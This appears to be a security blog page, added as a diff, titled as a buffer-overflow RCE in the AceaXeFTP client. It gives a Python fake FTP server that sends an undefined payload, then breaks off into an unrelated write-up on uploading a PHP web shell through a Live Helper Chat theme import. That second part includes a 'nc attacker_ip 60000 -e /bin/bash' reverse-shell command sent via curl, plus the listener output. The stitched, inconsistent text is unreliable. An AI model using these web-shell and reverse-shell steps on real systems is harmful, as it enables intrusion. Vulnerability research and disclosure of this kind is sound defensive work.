@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>RCE via Buffer Overflow - AceaXeFTP</title><link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">~/index</a></li><li><a href="/categories/">~/categories</a></li><li><a href="/about/">~/about</a></li></ul>
+  </div>
+</header>
+<main>
+      <p><strong style="color: greenyellow">RCE via Buffer Overflow - AceaXeFTP</strong></p>
+
+<h1 id="summary">Summary:</h1>
+<p>It’s Possible to trigger a buffer overflow, in AceaXeFTP client, by hosting a malicious ftp server and sending malicious responses to the client.</p>
+
+<h1 id="bin-info">Bin info:</h1>
+<p>Name: AceaXe +
+Homepage: http://www.labf.com/aceaxeplus/index.html</p>
+
+<h1 id="proof-of-concept-poc">Proof of Concept (PoC):</h1>
+
+<p>Studying to take the OSCE exam, i was simply fascinated by the Exploit dev topic, ASLR Bypass and SEH based exploits, was something that i needed to see in the internet jungle.
+ </p>
+
+<p>Doing the exercises, i was able to successfuly exploit one of the examples. So, i thought “Yeah, it’s time to find a really old software that i could run in a windows vista and try to find some AAAA shenanigans”, and that’s what i did, got first a windows xp and windows vista vm running and the AceaXe software bundle installed.
+ </p>
+
+<p>First, as i was really confortable with the basics of exploit dev, because of the OSCP background, i tried finding something in the windows xp, as it would not have ASLR nor DEP, so it would be easy to exploit. 
+ </p>
+
+<p>As i was researching i found a lot of PoCs of ftp clients that got exploited by sending the response of the ftp commands with the exploit code. so, after some hours of trying a lot of gui overflows and file sizes oveflows, I finnally tried creating my own fake FTP server in python and sending the famous EHLO response with a giant string &amp;afterwords, and it worked, EIP was finnaly overwritten by the AAAAs ! 
+ </p>
+
+<h1 id="finnally--time-to-exploit-winxp-version">Finnally ! Time to exploit (winXP version):</h1>
+
+<p>The concept was easy. Create a simple socket listening to port 21, that sends the string after the client connects to it.</p>
+
+<p> </p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">port</span> <span class="o">=</span> <span class="mi">21</span>                   
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s">'0.0.0.0'</span>              
+<span class="k">try</span><span class="p">:</span>
+	<span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>            
+	<span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>                     
+	<span class="k">print</span> <span class="p">(</span><span class="s">'[+] Ouvindo na porta 21.'</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s">'[-] Problemas no socket, veja se a porta 21 ja esta sendo utilizada'</span><span class="p">)</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+ 	<span class="k">try</span><span class="p">:</span>
+	    <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+	    <span class="k">print</span> <span class="p">(</span><span class="s">'[+] Envindo o payload'</span><span class="p">)</span>     
+	    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">dadosenviados</span><span class="p">)</span>
+	    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+	    <span class="k">print</span> <span class="p">(</span><span class="s">'[+] Chegou tua shell na porta 6666'</span><span class="p">)</span>
+	<span class="k">except</span><span class="p">:</span>
+		<span class="k">print</span> <span class="p">(</span><span class="s">'[-] Tivemos um prolema, veja se tudo foi settado corretamente'</span><span class="p">)</span></code></pre></figure>
+
+<p> </p>
+
+<p>Upon first inspection, there are no themes currently uploaded on the web application. The first step would be to try and upload a PHP file directly in one of the file inputs, however this does not seem to work in our case.</p>
+
+<p>In order to exploit this vulnerability, we must first create basic theme. Let’s move to the vulnerable directory.</p>
+
+<blockquote>
+  <p><strong style="color: red">/lhc_web/index.php/site_admin/abstract/new/WidgetTheme</strong></p>
+</blockquote>
+
+<p>We fill up the required inputs and parameters with dummy data. Then, we go back and download the theme from the Widget directory located here:</p>
+
+<blockquote>
+  <p><strong style="color: red">/lhc_web/index.php/site_admin/abstract/edit/WidgetTheme/1</strong></p>
+</blockquote>
+
+<p>When the file is downloaded, we open it and modify the <strong>offline_image_data parameter</strong> as well as the <strong>offline_image_data_ext</strong> parameter
+ </p>
+
+<p><strong>Payload:</strong> base64(Image Header + PHP Web Shell)
+ </p>
+
+<p><strong>Offline_image_data</strong> is replaced with the payload.
+<strong>Offline_image_data_ext</strong> is simply set to “php”.
+ </p>
+
+<p>The exploit should look something like this:
+ </p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Test"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"name_company"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Peter Winter"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"..[SNIP].."</span><span class="p">:</span><span class="w"> </span><span class="s2">"..[SNIP].."</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"offline_image_data"</span><span class="p">:</span><span class="w"> </span><span class="s2">"base64_payload"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"offline_image_data_ext"</span><span class="p">:</span><span class="w"> </span><span class="s2">"php"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p> 
+After the theme with the exploit is prepared it is uploaded on the web server in the following page:
+16px</p>
+<blockquote>
+  <p><strong style="color: red">/lhc_web/index.php/site_admin/theme/import</strong>
+ </p>
+</blockquote>
+
+<p><img src="/assets/images/image1.png" alt="import theme" class="images" />
+ </p>
+
+<p>After the upload is successful, the user must edit the imported theme at the Widget themes section. When the page is loaded, so is the php web shell. In our case, we have identified the path where the shell has been uploaded by viewing the page source and viewing the file path of the <strong>offline_image_data</strong> parameter:</p>
+
+<blockquote>
+  <p><strong style="color: red">/lhc_web/var/storagetheme/2018y/06/03/2/2c36ce9c8ebb012be3bcb3acb60abbc3.php</strong>
+ </p>
+</blockquote>
+
+<p>Our webshell can execute code on the server by using “cmd” as a parameter. The user can then proceed to set up a reverse shell to their machine by using nc. We then proceed to establishing a reverse shell connection by issuing the following command through the GET method. Firstly, we start a listener on our local machine.
+ </p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">&gt;</span> <span class="nv">$ </span>nc <span class="nt">-lnvp</span> 60000</code></pre></figure>
+
+<p> </p>
+
+<p>Then, we proceed to send a GET request to the webserver by leveraging our PHP web shell.
+ </p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">&gt;</span> <span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="se">\ </span>
+http://victim_ip/lhc_web/var/storagetheme/2018y/06/03/2/2c36ce9c8ebb012be3bcb3acb60abbc3.php?cmd<span class="o">=</span>nc+attacker_ip+60000+-e+/bin/bash</code></pre></figure>
+
+<p> </p>
+
+<p>If the connection is successful, we should get the following message on our listener. Upon issuing the id command, we find out that we are logged in as the www-data user.
+ </p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">&gt;</span> <span class="nv">$ </span> nc <span class="nt">-lnvp</span> 60000
+listening on <span class="o">[</span>any] 60000 ...
+connect to <span class="o">[</span>attacker_ip] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>vitim_ip] 40248
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span></code></pre></figure>
+
+<p> </p>
+
+<h1 id="some-of-the-recommendations-for-remediating-this-vulnerability-are-listed-below">Some of the recommendations for remediating this vulnerability are listed below:</h1>
+
+<ul>
+  <li>Restrict file types accepted for upload (check the file extension and only allow certain files to be uploaded.)</li>
+  <li>Use a whitelist approach instead of a blacklist.</li>
+  <li>Check for double extensions such as .php.png.</li>
+  <li>Check for files without a filename like .htaccess (on ASP.NET, check for configuration files like web.config).</li>
+  <li>Change the permissions on the upload folder so the files within it are not executable. If possible, rename the files that are uploaded.</li>
+  <li>Check OWASP page for unrestricted upload for the rest of best-practice solutions.</li>
+</ul>
+
+<h1 id="vulnerability-found-by">Vulnerability found by:</h1>
+<p>Me and <a href="https://twitter.com/0xcela">0xcela</a></p>
+
+
+    </main><footer>
+  Theme by [b2a3e8](https://github.com/b2a3e8/)
+</footer>
+</div>
+  </body>
+</html>
